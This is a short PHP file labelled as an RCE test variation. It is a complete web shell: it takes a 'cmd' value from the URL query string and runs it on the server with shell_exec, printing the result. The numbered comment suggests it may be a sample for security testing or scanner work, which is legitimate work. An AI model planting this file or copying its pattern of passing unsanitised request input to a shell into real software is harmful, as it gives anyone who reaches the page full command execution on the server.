<?php
// RCE test variation #912
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>